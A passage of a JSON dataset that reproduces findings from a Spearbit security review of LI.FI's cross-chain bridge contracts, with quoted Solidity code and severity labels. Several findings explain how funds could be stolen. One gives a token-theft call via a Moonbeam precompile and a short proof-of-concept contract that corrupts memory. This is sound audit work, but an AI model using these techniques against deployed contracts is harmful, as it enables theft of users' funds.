        "title": "Too many bytes are checked to verify the function selector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _executeSwaps() slices the callData with 8 bytes. The function selector is only 4 bytes. Also see docs So additional bytes are checked unnecessarily, which is probably unwanted. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) // should be 4 ) revert ContractCallNotAllowed(); ... } } Definition of dexFuncSignatureAllowList in LibStorage.sol: struct LibStorage { ... mapping(bytes32 => bool) dexFuncSignatureAllowList; ... // could be bytes4 }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check address(self) isnt accidentally whitelisted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are several access control mechanisms. If they somehow would allow address(self) then risks would increase as there are several ways to call arbitrary functions. library LibAccess { function addAccess(bytes4 selector, address executor) internal { ... accStor.execAccess[selector][executor] = true; } } contract AccessManagerFacet { function setCanExecute(...) ... { ) external { ... _canExecute ? LibAccess.addAccess(_selector, _executor) : LibAccess.removeAccess(_selector, ,! _executor); } } contract DexManagerFacet { function addDex(address _dex) external { ... dexAllowlist[_dex] = true; ... } function batchAddDex(address[] calldata _dexs) external { dexAllowlist[_dexs[i]] = true; ... ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify anyswap token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The AnyswapFacet supplies _anyswapData.token to different functions of _anyswapData.router. These functions interact with the contract behind _anyswapData.token. If the _anyswapData.token would be malicious then tokens can be stolen. Note, this is relevant if the LiFi contract are called directly without using the API. 30 function _startBridge(...) ... { ... IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }( _anyswapData.token,...); ... IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying( _anyswapData.token, ... ); ... IAnyswapRouter(_anyswapData.router).anySwapOut( _anyswapData.token, ...); ... ,! }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "More thorough checks for DAI in swapAndStartBridgeTokensViaXDaiBridge()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function swapAndStartBridgeTokensViaXDaiBridge() checks lifiData.sendingAssetId == DAI, however it doesnt check that the result of the swap is DAI (e.g. _swapData[_swapData.length - 1].re- ceivingAssetId == DAI ). function swapAndStartBridgeTokensViaXDaiBridge(...) ... { ... if (lifiData.sendingAssetId != DAI) { revert InvalidSendingToken(); } gnosisBridgeData.amount = _executeAndCheckSwaps(lifiData, swapData, payable(msg.sender)); ... _startBridge(gnosisBridgeData); // sends DAI }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Funds transferred via Connext may be lost on destination due to incorrect receiver or calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "_startBridge() in AmarokFacet.sol and NXTPFacet.sol sets user-provided receiver and call data for the destination chain.  The receiver is intended to be LifiDiamond contract address on destination chain.  The call data is intended such that the functions completeBridgeTokensVia{Amarok/NXTP}() or swapAnd- CompleteBridgeTokensVia{Amarok/NXTP}() are called. In case of a frontend bug or a user error, these parameters can be malformed which will lead to stuck (and stolen) funds on destination chain. Since the addresses and functions are already known, the contract can instead pass this data to Connext instead of taking it from the user. 31",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check output of swap is equal to amount bridged",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The result of swap (amount) isnt always checked to be the same as the bridged amount (_bridge- Data.amount). This way tokens could stay in the LiFi Diamond if more tokens are received with a swap than bridged. function swapAndStartBridgeTokensViaPolygonBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... _startBridge(_lifiData, _bridgeData, true); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { rootChainManager.depositEtherFor{ value: _bridgeData.amount }(_bridgeData.receiver); } else { ... LibAsset.maxApproveERC20(IERC20(_bridgeData.assetId), _bridgeData.erc20Predicate, ,! _bridgeData.amount); bytes memory depositData = abi.encode(_bridgeData.amount); rootChainManager.depositFor(_bridgeData.receiver, _bridgeData.assetId, depositData); } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing timelock logic on the DiamondCut facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In LiFi Diamond, any facet address/function selector can be changed by the contract owner. Connext, Diamond should go through a proposal window with a delay of 7 days. In function diamondCut( FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.diamondCut(_diamondCut, _init, _calldata); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Data from emit LiFiTransferStarted() cant be relied on",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Most of the function do an emit like LiFiTransferStarted(). Some of the fields of the emits are (sometimes) verified, but most fields come from the input variable _lifiData. The problem with this is that anyone can do solidity transactions to the LiFi bridge and supply wrong data for the emit. For example: transfer a lot of Doge coins and in the emit say they are transferring wrapped BTC. Then the statistics would say a large amount of volume has been transferred, while in reality it is neglectable. The advantage of using a blockchain is that the data is (seen as) reliable. If the data isnt reliable, it isnt worth the trouble (gas cost) to store it in a blockchain and it could just be stored in an offline database. The result of this is, its not useful to create a subgraph on the emit data (because it is unreliable). This would mean a lot of extra work for subgraph builders to reverse engineer what is going on. Also any kickback fees to in- tegrators or referrers cannot be based on this data because it is unreliable. Also user interfaces & dashboards could display the wrong information. 33 function startBridgeTokensViaOmniBridge(LiFiData calldata _lifiData, ...) ... { ... LibAsset.depositAsset(_bridgeData.assetId, _bridgeData.amount); _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing emit in XChainExecFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function swapAndCompleteBridgeTokens of Executor does do an emit LiFiTransferCom- pleted , while the comparable function in XChainExecFacet doesnt do this emit. This way there will be missing emits. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... emit LiFiTransferCompleted( ... ); } } contract XChainExecFacet is SwapperV2, ReentrancyGuard { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... // no emit } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Different access control to withdraw funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "To withdraw any stuck tokens, WithdrawFacet.sol provides two functions: executeCallAndWith- draw() and withdraw(). Both have different access controls on them.  executeCallAndWithdraw() can be called by the owner or if msg.sender has been approved to call a function whose signature matches that of executeCallAndWithdraw().  withdraw() can only be called by the owner. If the function signature of executeCallAndWithdraw() clashes with an approved signature in execAccess map- ping, the approved address can steal all the funds in LifiDiamond contract.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use internal where possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several functions have an access control where the msg.sender if compared to address(this), which means it can only be called from the same contract. In the current code with the various generic call mechanisms this isnt a safe check. For example the function _execute() from Executor.sol can circumvent this check. Luckily the function where this has been used have a low risk profile so the risk of this issue is limited. function swapAndCompleteBridgeTokensViaStargate(...) ... { if (msg.sender != address(this)) { revert InvalidCaller(); } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Event of transfer is not emitted in the AxelarFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The usage of the LiFi protocol depends largely to the off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. The events are useful to record these changes on-chain for off-chain monitors/tools/interfaces when integrating with off-chain APIs. Although, other facets are emitting LiFiTransferStarted event, AxelarFacet does not emit this event. contract AxelarFacet { function executeCallViaAxelar(...) ... {} function executeCallWithTokenViaAxelar(...) ... {} } On the receiving side, the Executor contract does do an emit in function _execute() but not in function _- executeWithToken(). contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _execute(...) ... { ... emit AxelarExecutionComplete(callTo, bytes4(callData)); } function _executeWithToken( ... // no emit } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Improve checks on the facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the facets, receiver/destination address and amount checks are missing.  The symbol parameter is used to get address of token with gateways tokenAddresses function. tokenAd- dresses function get token address by mapping. If the symbol does not exist, the token address can be zero. AxelarFacet and Executor do not check If the given symbol exists or not. 36 contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } function initAxelar(address _gateway, address _gasReceiver) external { s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } } contract Executor { function _executeWithToken(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } }  GnosisBridgeFacet, CBridgeFacet, HopFacet and HyphenFacets are missing receiver address/amount check. contract CBridgeFacet { function _startBridge(...) ... { ... _cBridgeData.receiver ... } } contract GnosisBridgeFacet { function _startBridge(...) ... { ... gnosisBridgeData.receiver ... } } contract HopFacet { function _startBridge(...) ... { _hopData.recipient, ... ... } } contract HyphenFacet { function _startBridge(...) ... { _hyphenData.recipient ... ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use keccak256() instead of hex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several NAMESPACEs are defined, some with a hex value and some with a keccak256(). To be able to verify they are all different it is better to use the same format everywhere. If they would use the same value then the variables stored on that location could interfere with each other and the LiFi Diamond could start to behave unreliably. ... NAMESPACE = hex\"c7...\"; // keccak256(\"com.lifi.facets.axelar\") ... NAMESPACE = hex\"cf...\"; // keccak256(\"com.lifi.facets.ownership\"); ... NAMESPACE = hex\"a6...\"; ReentrancyGuard.sol: AxelarFacet.sol: OwnershipFacet.sol: PeripheryRegistryFacet.sol: ... NAMESPACE = hex\"dd...\"; // keccak256(\"com.lifi.facets.periphery_registry\"); ,! StargateFacet.sol: LibAccess.sol: ,! LibDiamond.sol: keccak256(\"com.lifi.library.access.management\") ... NAMESPACE = keccak256(\"com.lifi.facets.stargate\"); ... ACCESS_MANAGEMENT_POSITION = hex\"df...\"; // ... DIAMOND_STORAGE_POSITION = keccak256(\"diamond.standard.diamond.storage\");",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Remove redundant Swapper.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are two versions of Swapper.sol (e.g Swapper.sol and SwapperV2.sol ) which are function- ally more or less the same. The WormholeFacet contract is the only one still using Swapper.sol. Having two versions of the same code is confusing and difficult to maintain. import { Swapper } from \"../Helpers/Swapper.sol\"; contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use additional checks for transferFrom()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several functions transfer tokens via transferFrom() without checking the return code. Some of the contracts are not covering edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers.  Some ERC20 implementations dont revert is the balance is insufficient but return false. Other functions transfer tokens with checking if the amount of tokens received is equal to the amount of tokens requested. This relevant for tokens that withhold a fee. Luckily there is always additional code, like bridge, dex or pool code, that verifies the amount of tokens received, so the risk is limited. contract AxelarFacet { function executeCallWithTokenViaAxelar(... ) ... { ... IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount); // no check on return ,! code & amount of tokens ... } } contract ERC20Proxy is Ownable { function transferFrom(...) ... { ... IERC20(tokenAddress).transferFrom(from, to, amount); // no check on return code & amount of ,! tokens ... } } contract FusePoolZap { function zapIn(...) ... { ... IERC20(_supplyToken).transferFrom(msg.sender, address(this), _amount); // no check on amount of tokens ,! return code & } } library LibSwap { function swap(...) ... { ... LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); // no check on amount of tokens } ,! }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Move code to check amount of tokens transferred to library",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Facet.sol,OptimismBridgeFacet.sol, PolygonBridgeFacet.sol and StargateFacet.sol, to verify all required tokens are indeed transferred. The following piece of code is present However it doesnt check msg.value == _bridgeData.amount in case a native token is used. The more generic depositAsset() of LibAsset.sol does have this check. uint256 _fromTokenBalance = LibAsset.getOwnBalance(_bridgeData.assetId); LibAsset.transferFromERC20(_bridgeData.assetId, msg.sender, address(this), _bridgeData.amount); if (LibAsset.getOwnBalance(_bridgeData.assetId) - _fromTokenBalance != _bridgeData.amount) { revert InvalidAmount(); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fuse pools are not whitelisted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Rari Fuse is a permissionless framework for creating and running user-created open interest rate pools with customizable parameters. On the FusePoolZap contract, the correctness of pool is not checked. Be- cause of Fuse is permissionless framework, an attacker can create a fake pool, through this contract a user can be be tricked in the malicious pool. function zapIn( address _pool, address _supplyToken, uint256 _amount ) external {}",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing two-step transfer ownership pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Executor contract used for arbitrary cross-chain and same chain execution, swaps and transfers. The Executor contract uses Ownable from OpenZeppelin which is a simple mechanism to transfer the ownership not supporting a two-steps transfer ownership pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Transferring ownership is a critical operation and transferring it to an inaccessible wallet or renouncing the owner- ship e.g. by mistake, can effectively lost functionality.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use low-level call only on contract addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the following case, if callTo is an EOA, success will be true. (bool success, ) = callTo.call(callData); The user intention here will be to do a smart contract call. So if there is no code deployed at callTo, the execution should be reverted. Otherwise, users can be under a wrong assumption that their cross-chain call was successful.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Functions which do not expect ether should be non-payable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "A function which doesnt expect ether should not be marked payable. swapAndStartBridgeTo- kensViaAmarok() is a payable function, however it reverts when called for the native asset: if (_bridgeData.assetId == address(0)) { revert TokenAddressIsZero(); } So in the case where _bridgeData.assetId != address(0), any ether sent as msg.value is locked in the con- tract.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incompatible contract used in the WormholeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that all other faucets are using SwapperV2 contract. However, the WormholeFacet is still using Swapper contract. With the recent change on the SwapperV2, leftOvers can be send to specific receiver. With the using old contract, this capability will be lost in the related faucet. Also, LiFi Team claims that Swapper contract will be deprecated. ... import { Swapper } from \"../Helpers/Swapper.sol\"; /// @title Wormhole Facet /// @author [LI.FI](https://li.fi) /// @notice Provides functionality for bridging through Wormhole contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Solidity version bump to latest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the review the newest version of solidity was released with the important bug fixes & Bug.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bridge with AmarokFacet can fail due to hardcoded variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that callbackFee and relayerFee are set to 0. However, Connext mentioned that Its set to 0 on the testnet. On the mainnet, these variables can be edited by Connext and AmarokFacet bridge operations can fail. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, // fee paid to relayers; relayers don't take any fees on testnet relayerFee: 0, // fee paid to relayers; relayers don't take any fees on testnet slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Store _dexs[i] into a temp variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The DexManagerFacet can store _dexs[i] into a temporary variable to save some gas. function batchAddDex(address[] calldata _dexs) external { if (msg.sender != LibDiamond.contractOwner()) { LibAccess.enforceAccessControl(); } mapping(address => bool) storage dexAllowlist = appStorage.dexAllowlist; uint256 length = _dexs.length; for (uint256 i = 0; i < length; i++) { _checkAddress(_dexs[i]); if (dexAllowlist[_dexs[i]]) continue; dexAllowlist[_dexs[i]] = true; appStorage.dexs.push(_dexs[i]); emit DexAdded(_dexs[i]); } } 43",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize array length in for loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In a for loop the length of an array can be put in a temporary variable to save some gas. This has been done already in several other locations in the code. function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { ... } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "StargateFacet can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "It might be cheaper to call getTokenFromPoolId in a constructor and store in immutable variables (especially because there are not that many pool, currently max 3 per chain pool-ids ) On the other hand, It requires an update of the facet when new pools are added though. function getTokenFromPoolId(address _router, uint256 _poolId) private view returns (address) { address factory = IStargateRouter(_router).factory(); address pool = IFactory(factory).getPool(_poolId); return IPool(pool).token(); } For the srcPoolId it would be possible to replace this with a token address in the calling interface and lookup the poolid. However, for dstPoolId this would be more difficult, unless you restrict it to the case where srcPoolId == dstPoolId e.g. the same asset is received on the destination chain. This seems a logical restriction. The advantage of not having to specify the poolids is that you abstract the interface from the caller and make the function calls more similar.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use block.chainid for chain ID verification in HopFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "HopFacet.sol uses user provided _hopData.fromChainId to identify current chain ID. Call to Hop Bridge will revert if it does not match block.chain, so this is still secure. However, as a gas optimization, this parameter can be removed from HopData struct, and its usage can be replaced by block.chainid.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rename event InvalidAmount(uint256) to ZeroAmount()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "event InvalidAmount(uint256) is emitted only with an argument of 0: if (_amount <= 0) { revert InvalidAmount(_amount); } ... if (msg.value <= 0) { revert InvalidAmount(msg.value); } Since amount and msg.value can only be non-negative, these if conditions succeed only when these values are 0. Hence, only InvalidAmount(0) is ever emitted.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use custom errors instead of strings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization LibDiamond.sol#L56,"
        ]
    },
    {
        "title": "Use calldata over memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. If the array is passed to an internal function which passes the array to another internal function where the array is modified and therefore memory is used in the external call, its still more gass-efficient to use calldata when the external function uses modifiers, since the modifiers may prevent the internal functions from being called. Some gas savings if function arguments are passed as calldata instead of memory.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid reading from storage when possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Functions, which can only be called by the contracts owner, can use msg.sender to read owners In all these cases below, ownership check is already done, so it is address after the ownership check is done. guaranteed that owner == msg.sender. LibAsset.transferAsset(tokenAddress, payable(owner), balance); ... LibAsset.transferAsset(tokenAddresses[i], payable(owner), balance); ... if (_newOwner == owner) revert NewOwnerMustNotBeSelf(); owner is a state variable, so reading it has significant gas costs. This can be avoided here by using msg.sender instead.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Increment for loop variable in an unchecked block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "(This is only relevant if you are using the default solidity checked arithmetic). i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Executor should consider pre-deployed contract behaviors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Executor contract allows users to do arbitrary calls. This allows users to trigger pre-deployed contracts (which are used on specific chains). Since the behaviors of pre-deployed contracts differ, dapps on different evm compatible chain would have different security assumption. Please refer to the Avax bug fix. Native-asset-call-deprecation Were the native asset call not deprecated, exploiters can bypass the check and triggers ERC20Proxy through the pre-deployed contract. Since the Avalanche team has deprecated the dangerous pre-deployed, the current Executor contract is not vulnerable. Moonbeams pre-deployed contract also has strange behaviors. Precompiles erc20 allows users transfer native token through ERC20 interface. Users can steal native tokens on the Executor by setting callTo = address(802) and calldata = transfer(receiver, amount) One of the standard ethereum mainnet precompiles is \"Identity\" (0x4), which copies memory. Depending on the use of memory variables of the function that does the callTo, it can corrupt memory. Here is a POC: 47 pragma solidity ^0.8.17; import \"hardhat/console.sol\"; contract Identity { function CorruptMem() public { uint dest = 128; uint data = dest + 1 ; uint len = 4; assembly { if iszero(call(gas(), 0x04, 0, add(data, 0x20), len, add(dest,0x20), len)) { invalid() } } } constructor() { string memory a = \"Test!\"; CorruptMem(); console.log(string(a)); // --> est!! } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Documentation improvements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are a few issues in the documentation:  HyphenFacets documentation describes a function no longer present.  Link to DexManagerFacet in README.md is incorrect.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check quoteTimestamp is within ten minutes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "quoteTimestamp is not validated. According to Across, quoteTimestamp variable, at which the depositor will be quoted for L1 liquidity. This enables the depositor to know the L1 fees before submitting their deposit. Must be within 10 mins of the current time. function _startBridge(AcrossData memory _acrossData) internal { bool isNative = _acrossData.token == ZERO_ADDRESS; if (isNative) _acrossData.token = _acrossData.weth; else LibAsset.maxApproveERC20(IERC20(_acrossData.token), _acrossData.spokePool, ,! _acrossData.amount); IAcrossSpokePool pool = IAcrossSpokePool(_acrossData.spokePool); pool.deposit{ value: isNative ? _acrossData.amount : 0 }( _acrossData.recipient, _acrossData.token, _acrossData.amount, _acrossData.destinationChainId, _acrossData.relayerFeePct, _acrossData.quoteTimestamp ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Integrate two versions of depositAsset()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function depositAsset(, , isNative ) doesnt check tokenId == NATIVE_ASSETID, although depositAsset(,) does. In the code base depositAsset(, , isNative ) isnt used. function depositAsset( address tokenId, uint256 amount, bool isNative ) internal { if (amount == 0) revert InvalidAmount(); if (isNative) { ... } else { ... } } function depositAsset(address tokenId, uint256 amount) internal { return depositAsset(tokenId, amount, tokenId == NATIVE_ASSETID); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify batchRemoveDex()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The code of batchRemoveDex() is somewhat difficult to understand and thus to maintain. function batchRemoveDex(address[] calldata _dexs) external { ... uint256 jlength = storageDexes.length; for (uint256 i = 0; i < ilength; i++) { ... for (uint256 j = 0; j < jlength; j++) { if (storageDexes[j] == _dexs[i]) { ... // update storageDexes.length; jlength = storageDexes.length; break; } } } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Error handing in executeCallAndWithdraw",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "If isContract happens to be false then success is false (as it is initialized as false and not updated) Thus the _withdrawAsset() will never happen. Function withdraw() also exist so this functionality isnt necessary but its more logical to revert earlier. 50 function executeCallAndWithdraw(...) ... { ... bool success; bool isContract = LibAsset.isContract(_callTo); if (isContract) { false // thus is false ,! (success, ) = _callTo.call(_callData); } if (success) { // if this is false, then success stays _withdrawAsset(_assetAddress, _to, _amount); // this never happens if isContract == false } else { revert WithdrawFailed(); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "_withdrawAsset() could use LibAsset.transferAsset()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
